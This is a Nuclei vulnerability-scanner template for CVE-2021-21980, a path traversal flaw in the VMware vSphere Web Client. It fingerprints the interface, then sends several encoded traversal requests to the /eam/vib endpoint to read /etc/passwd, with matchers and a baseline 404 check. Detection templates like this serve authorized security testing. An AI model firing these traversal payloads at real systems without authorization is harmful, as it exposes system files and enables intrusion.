id: cve-2021-21980
info:
  name: VMware vSphere Web Client Path Traversal (CVE-2021-21980)
  author: ProjectDiscovery / YourName
  severity: critical
  description: |
    VMware vSphere Web Client contains a path traversal vulnerability which
    can allow an unauthenticated attacker to read arbitrary files.
    This template verifies the vulnerability by attempting to read /etc/passwd via
    the vulnerable endpoint. It tries multiple encodings to reduce false positives.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-21980
  tags:
    - cve
    - vmware
    - path-traversal
    - vcenter
    - cwe-22
  # example: nuclei -t cve-2021-21980.yaml -u http://localhost:8080

flow: http(1) && http(2)

http:
  - id: fingerprint
    name: fingerprint-vsphere-ui
    method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/ui"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "VMware"
          - "vSphere"
          - "vCenter"
      - type: word
        part: header
        name: Server
        words:
          - "VMware"

  - id: poc
    name: path-traversal-passwd
    method: GET
    stop-at-first-match: true
    path:
      - "{{BaseURL}}/eam/vib?id=../../../../../../../../../../etc/passwd"
      - "{{BaseURL}}/eam/vib?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
      - "{{BaseURL}}/eam/vib?id=..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd"
      - "{{BaseURL}}/eam/vib?id=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
      - "{{BaseURL}}/eam/vib?id=..%2F..%2F..%2F..%2F..%2F..%252F..%2Fetc%2Fpasswd"
      - "{{BaseURL}}/eam/vib?id=..%2F..%2F..%2F..%2F..%2F..%2F%00etc%2Fpasswd"
      - "{{BaseURL}}/eam/vib?id=..%C0%AF..%C0%AF..%C0%AF%C0%AF/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "(^|\\n)root:.*:0:0:"
      - type: word
        part: body
        words:
          - "root:x:0:0:"
      # size match removed due to nuclei filter syntax variance; we rely on status+regex+word

  - id: baseline
    name: baseline-404
    method: GET
    path:
      - "{{BaseURL}}/eam/vib?id=../../../../../../../../../../this_file_should_not_exist_{{randstr}}"
    matchers:
      - type: status
        status:
          - 404

### Example usage included in top 'info' block; duplicate 'info' removed

# Notes:
# - This template implements fingerprinting, multiple encoded path variations and a baseline 404
#   to reduce false-positives. Use only against systems you are authorized to test.
# - The mock server in this repo replicates the vulnerable behavior for safer testing.
# - If adapting to scanning a real vSphere instance, tune matchers and payloads to the environment.
